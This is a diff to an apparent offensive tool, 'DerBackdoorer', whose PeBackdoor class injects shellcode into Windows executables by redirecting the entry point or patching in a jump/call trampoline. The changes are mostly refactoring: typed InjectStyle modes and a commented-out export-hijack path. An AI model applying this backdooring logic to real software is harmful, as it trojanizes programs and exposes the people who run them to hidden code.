@@ -13,21 +13,16 @@ import logging
 
 from helper import hexdump
 from derbackdoorer.mype import MyPe
+from model.defs import *
 
 logger = logging.getLogger("DerBackdoorer")
 
 
 class PeBackdoor:
-    class SupportedRunModes(IntEnum):
-        ModifyOEP           = 1
-        BackdoorEP          = 2
-        HijackExport        = 4
-
-
-    def __init__(self, mype: MyPe, main_shc, inject_mode):
+    def __init__(self, mype: MyPe, main_shc: bytes, inject_mode: InjectStyle):
         self.mype: MyPe = mype
-        self.runMode = inject_mode
-        self.shellcodeData = main_shc
+        self.runMode: InjectStyle = inject_mode
+        self.shellcodeData: bytes = main_shc
 
         # Working
         self.shellcodeOffset: int  = 0    # from start of the file
@@ -77,22 +72,22 @@ Trailing {sect_name} bytes:
 
 
     def setupShellcodeEntryPoint(self):
-        if self.runMode == int(PeBackdoor.SupportedRunModes.ModifyOEP):
+        if self.runMode == InjectStyle.ChangeEntryPoint:
             rva = self.mype.pe.get_rva_from_offset(self.shellcodeOffset)
             self.mype.set_entrypoint(rva)
 
             logger.info(f'Address Of Entry Point changed to: RVA 0x{rva:x}')
             return True
 
-        elif self.runMode == int(PeBackdoor.SupportedRunModes.BackdoorEP):
+        elif self.runMode == InjectStyle.BackdoorCallInstr:
             return self.backdoorEntryPoint()
 
-        elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
-            addr = self.getExportEntryPoint()
-            if addr == -1:
-                logger.critical('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')
-
-            return self.backdoorEntryPoint(addr)
+        #elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
+        #    addr = self.getExportEntryPoint()
+        #    if addr == -1:
+        #        logger.critical('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')
+        #
+        #    return self.backdoorEntryPoint(addr)
 
         return False
     
@@ -250,7 +245,7 @@ Trailing {sect_name} bytes:
             self.compiledTrampoline = encoding
             self.compiledTrampolineCount = count
 
-            logger.info('Successfully backdoored entry point with jump/call to shellcode.\n')
+            logger.info('Successfully backdoored entry point with jump/call to shellcode')
             return instr.address
 
         return 0
